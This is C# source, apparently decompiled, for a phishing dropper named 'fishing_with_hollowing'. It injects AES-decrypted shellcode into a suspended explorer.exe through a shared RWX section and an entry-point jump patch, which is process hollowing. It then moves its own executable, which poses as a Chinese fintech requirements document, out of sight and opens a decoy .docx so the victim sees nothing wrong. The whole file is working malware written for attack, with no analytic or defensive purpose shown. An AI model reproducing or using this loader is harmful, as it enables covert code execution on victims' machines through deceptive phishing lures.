using fishing_with_hollowing.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace fishing_with_hollowing
{
	public sealed class Loader
	{
		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;

			public IntPtr hThread;

			public int dwProcessId;

			public int dwThreadId;
		}

		internal struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr Reserved1;

			public IntPtr PebAddress;

			public IntPtr Reserved2;

			public IntPtr Reserved3;

			public IntPtr UniquePid;

			public IntPtr MoreReserved;
		}

		internal struct STARTUPINFO
		{
			private uint cb;

			private IntPtr lpReserved;

			private IntPtr lpDesktop;

			private IntPtr lpTitle;

			private uint dwX;

			private uint dwY;

			private uint dwXSize;

			private uint dwYSize;

			private uint dwXCountChars;

			private uint dwYCountChars;

			private uint dwFillAttributes;

			private uint dwFlags;

			private ushort wShowWindow;

			private ushort cbReserved;

			private IntPtr lpReserved2;

			private IntPtr hStdInput;

			private IntPtr hStdOutput;

			private IntPtr hStdErr;
		}

		public struct SYSTEM_INFO
		{
			public uint dwOem;

			public uint dwPageSize;

			public IntPtr lpMinAppAddress;

			public IntPtr lpMaxAppAddress;

			public IntPtr dwActiveProcMask;

			public uint dwNumProcs;

			public uint dwProcType;

			public uint dwAllocGranularity;

			public ushort wProcLevel;

			public ushort wProcRevision;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct LARGE_INTEGER
		{
			public uint LowPart;

			public int HighPart;
		}

		public const uint PageReadWriteExecute = 64u;

		public const uint PageReadWrite = 4u;

		public const uint PageExecuteRead = 32u;

		public const uint MemCommit = 4096u;

		public const uint SecCommit = 134217728u;

		public const uint GenericAll = 268435456u;

		public const uint CreateSuspended = 4u;

		public const uint DetachedProcess = 8u;

		public const uint CreateNoWindow = 134217728u;

		private IntPtr section_;

		private IntPtr localmap_;

		private IntPtr remotemap_;

		private IntPtr localsize_;

		private IntPtr remotesize_;

		private IntPtr pModBase_;

		private IntPtr pEntry_;

		private uint rvaEntryOffset_;

		private uint size_;

		private byte[] inner_;

		private const int AttributeSize = 24;

		private const ulong PatchSize = 16uL;

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref Loader.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

		[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern void GetSystemInfo(ref Loader.SYSTEM_INFO lpSysInfo);

		[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern IntPtr GetCurrentProcess();

		[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern void CloseHandle(IntPtr handle);

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

		[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref Loader.STARTUPINFO lpStartinfo, out Loader.PROCESS_INFORMATION lpProcInformation);

		[DllImport("kernel32.dll")]
		private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern uint ResumeThread(IntPtr hThread);

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref Loader.PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

		[DllImport("kernel32.dll")]
		private static extern uint GetLastError();

		public uint round_to_page(uint size)
		{
			Loader.SYSTEM_INFO sYSTEM_INFO = default(Loader.SYSTEM_INFO);
			Loader.GetSystemInfo(ref sYSTEM_INFO);
			return sYSTEM_INFO.dwPageSize - size % sYSTEM_INFO.dwPageSize + size;
		}

		private bool nt_success(long v)
		{
			return v >= 0L;
		}

		public IntPtr GetCurrent()
		{
			return Loader.GetCurrentProcess();
		}

		public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
		{
			IntPtr key = addr;
			IntPtr value = (IntPtr)((long)((ulong)this.size_));
			long v = (long)Loader.ZwMapViewOfSection(this.section_, procHandle, ref key, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref value, 1, 0u, protect);
			if (!this.nt_success(v))
			{
				throw new SystemException("[x] Something went wrong! " + v.ToString());
			}
			return new KeyValuePair<IntPtr, IntPtr>(key, value);
		}

		public bool CreateSection(uint size)
		{
			Loader.LARGE_INTEGER lARGE_INTEGER = default(Loader.LARGE_INTEGER);
			this.size_ = this.round_to_page(size);
			lARGE_INTEGER.LowPart = this.size_;
			long v = (long)Loader.ZwCreateSection(ref this.section_, 268435456u, (IntPtr)0, ref lARGE_INTEGER, 64u, 134217728u, (IntPtr)0);
			return this.nt_success(v);
		}

		public void SetLocalSection(uint size)
		{
			KeyValuePair<IntPtr, IntPtr> keyValuePair = this.MapSection(this.GetCurrent(), 64u, IntPtr.Zero);
			if (keyValuePair.Key == (IntPtr)0)
			{
				throw new SystemException("[x] Failed to map view of section!");
			}
			this.localmap_ = keyValuePair.Key;
			this.localsize_ = keyValuePair.Value;
		}

		public unsafe void CopyShellcode(byte[] buf)
		{
			long num = (long)((ulong)this.size_);
			if ((long)buf.Length > num)
			{
				throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");
			}
			byte* ptr = (byte*)((void*)this.localmap_);
			for (int i = 0; i < buf.Length; i++)
			{
				ptr[i] = buf[i];
			}
		}

		public Loader.PROCESS_INFORMATION StartProcess(string path)
		{
			Loader.STARTUPINFO sTARTUPINFO = default(Loader.STARTUPINFO);
			Loader.PROCESS_INFORMATION result = default(Loader.PROCESS_INFORMATION);
			uint dwCreateFlags = 4u;
			if (!Loader.CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, dwCreateFlags, (IntPtr)0, (IntPtr)0, ref sTARTUPINFO, out result))
			{
				throw new SystemException("[x] Failed to create process!");
			}
			return result;
		}

		public unsafe KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
		{
			int num = 0;
			IntPtr value = Marshal.AllocHGlobal((IntPtr)16L);
			byte* ptr = (byte*)((void*)value);
			byte[] bytes;
			if (IntPtr.Size == 4)
			{
				ptr[num] = 184;
				num++;
				bytes = BitConverter.GetBytes((int)dest);
			}
			else
			{
				ptr[num] = 72;
				num++;
				ptr[num] = 184;
				num++;
				bytes = BitConverter.GetBytes((long)dest);
			}
			for (int i = 0; i < IntPtr.Size; i++)
			{
				ptr[num + i] = bytes[i];
			}
			num += IntPtr.Size;
			ptr[num] = 255;
			num++;
			ptr[num] = 224;
			num++;
			return new KeyValuePair<int, IntPtr>(num, value);
		}

		private unsafe IntPtr GetEntryFromBuffer(byte[] buf)
		{
			IntPtr result = IntPtr.Zero;
			fixed (byte[] array = buf)
			{
				byte* ptr;
				if (buf == null || array.Length == 0)
				{
					ptr = null;
				}
				else
				{
					ptr = &array[0];
				}
				uint num = *(uint*)(ptr + 60);
				byte* expr_2B = ptr + num + 24;
				ushort arg_2D_0 = *(ushort*)expr_2B;
				int num2 = *(int*)(expr_2B + 16);
				this.rvaEntryOffset_ = (uint)num2;
				if (IntPtr.Size == 4)
				{
					result = (IntPtr)(this.pModBase_.ToInt32() + num2);
				}
				else
				{
					result = (IntPtr)(this.pModBase_.ToInt64() + (long)num2);
				}
			}
			this.pEntry_ = result;
			return result;
		}

		public IntPtr FindEntry(IntPtr hProc)
		{
			Loader.PROCESS_BASIC_INFORMATION pROCESS_BASIC_INFORMATION = default(Loader.PROCESS_BASIC_INFORMATION);
			uint num = 0u;
			long v = (long)Loader.ZwQueryInformationProcess(hProc, 0, ref pROCESS_BASIC_INFORMATION, (uint)(IntPtr.Size * 6), ref num);
			if (!this.nt_success(v))
			{
				throw new SystemException("[x] Failed to get process information!");
			}
			IntPtr lpBaseAddress = IntPtr.Zero;
			byte[] array = new byte[IntPtr.Size];
			if (IntPtr.Size == 4)
			{
				lpBaseAddress = (IntPtr)((int)pROCESS_BASIC_INFORMATION.PebAddress + 8);
			}
			else
			{
				lpBaseAddress = (IntPtr)((long)pROCESS_BASIC_INFORMATION.PebAddress + 16L);
			}
			IntPtr zero = IntPtr.Zero;
			if (!Loader.ReadProcessMemory(hProc, lpBaseAddress, array, array.Length, out zero) || zero == IntPtr.Zero)
			{
				throw new SystemException("[x] Failed to read process memory!");
			}
			if (IntPtr.Size == 4)
			{
				lpBaseAddress = (IntPtr)BitConverter.ToInt32(array, 0);
			}
			else
			{
				lpBaseAddress = (IntPtr)BitConverter.ToInt64(array, 0);
			}
			this.pModBase_ = lpBaseAddress;
			if (!Loader.ReadProcessMemory(hProc, lpBaseAddress, this.inner_, this.inner_.Length, out zero) || zero == IntPtr.Zero)
			{
				throw new SystemException("[x] Failed to read module start!");
			}
			return this.GetEntryFromBuffer(this.inner_);
		}

		public void MapAndStart(Loader.PROCESS_INFORMATION pInfo)
		{
			KeyValuePair<IntPtr, IntPtr> keyValuePair = this.MapSection(pInfo.hProcess, 64u, IntPtr.Zero);
			if (keyValuePair.Key == (IntPtr)0 || keyValuePair.Value == (IntPtr)0)
			{
				throw new SystemException("[x] Failed to map section into target process!");
			}
			this.remotemap_ = keyValuePair.Key;
			this.remotesize_ = keyValuePair.Value;
			KeyValuePair<int, IntPtr> keyValuePair2 = this.BuildEntryPatch(keyValuePair.Key);
			try
			{
				IntPtr nSize = (IntPtr)keyValuePair2.Key;
				IntPtr value = 0;
				if (!Loader.WriteProcessMemory(pInfo.hProcess, this.pEntry_, keyValuePair2.Value, nSize, out value) || value == IntPtr.Zero)
				{
					throw new SystemException("[x] Failed to write patch to start location! " + Loader.GetLastError().ToString());
				}
			}
			finally
			{
				if (keyValuePair2.Value != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(keyValuePair2.Value);
				}
			}
			byte[] lpBuffer = new byte[4096];
			IntPtr intPtr = 0;
			if (!Loader.ReadProcessMemory(pInfo.hProcess, this.pEntry_, lpBuffer, 1024, out intPtr))
			{
				throw new SystemException("Failed!");
			}
			if (Loader.ResumeThread(pInfo.hThread) == 4294967295u)
			{
				throw new SystemException("[x] Failed to restart thread!");
			}
		}

		public IntPtr GetBuffer()
		{
			return this.localmap_;
		}

		~Loader()
		{
			if (this.localmap_ != (IntPtr)0)
			{
				Loader.ZwUnmapViewOfSection(this.section_, this.localmap_);
			}
		}

		public void Load(string targetProcess, byte[] shellcode)
		{
			Loader.PROCESS_INFORMATION pROCESS_INFORMATION = this.StartProcess(targetProcess);
			this.FindEntry(pROCESS_INFORMATION.hProcess);
			if (!this.CreateSection((uint)shellcode.Length))
			{
				throw new SystemException("[x] Failed to create new section!");
			}
			this.SetLocalSection((uint)shellcode.Length);
			this.CopyShellcode(shellcode);
			this.MapAndStart(pROCESS_INFORMATION);
			Loader.CloseHandle(pROCESS_INFORMATION.hThread);
			Loader.CloseHandle(pROCESS_INFORMATION.hProcess);
		}

		public Loader()
		{
			this.section_ = 0;
			this.localmap_ = 0;
			this.remotemap_ = 0;
			this.localsize_ = 0;
			this.remotesize_ = 0;
			this.inner_ = new byte[4096];
		}

		private static byte[] Decompress(byte[] gzip)
		{
			byte[] result;
			using (GZipStream gZipStream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
			{
				byte[] buffer = new byte[4096];
				using (MemoryStream memoryStream = new MemoryStream())
				{
					int num;
					do
					{
						num = gZipStream.Read(buffer, 0, 4096);
						if (num > 0)
						{
							memoryStream.Write(buffer, 0, num);
						}
					}
					while (num > 0);
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		public static string AesDecrypt(string str, string key)
		{
			if (string.IsNullOrEmpty(str))
			{
				return null;
			}
			byte[] array = Convert.FromBase64String(str);
			byte[] bytes = new RijndaelManaged
			{
				Key = Encoding.UTF8.GetBytes(key),
				Mode = CipherMode.ECB,
				Padding = PaddingMode.PKCS7
			}.CreateDecryptor().TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes);
		}

		private static void Main(string[] args)
		{
			string tempPath = Path.GetTempPath();
			string targetProcess = "c:\\windows\\explorer.exe";
			//byte[] shellcode = Loader.Decompress(Convert.FromBase64String(Loader.AesDecrypt("sa", "164329457b343765")));
			byte[] shellcode = Convert.FromBase64String(Loader.AesDecrypt("sa", "164329457b343765"));
			File.Move("交广微贷易金融实名注册需求文档.exe", tempPath + Guid.NewGuid().ToString());
			Loader loader = new Loader();
			try
			{
				loader.Load(targetProcess, shellcode);
			}
			catch (Exception ex)
			{
				Console.WriteLine("[x] Something went wrong!" + ex.Message);
			}
			byte[] array = new byte[Resource1.bb.Length];
			Resource1.bb.CopyTo(array, 0);
			FileStream expr_9B = new FileStream("交广微贷易金融实名注册需求文档.docx", FileMode.Create, FileAccess.Write);
			expr_9B.Write(array, 0, array.Length);
			expr_9B.Close();
			Process.Start("交广微贷易金融实名注册需求文档.docx");
		}
	}
}
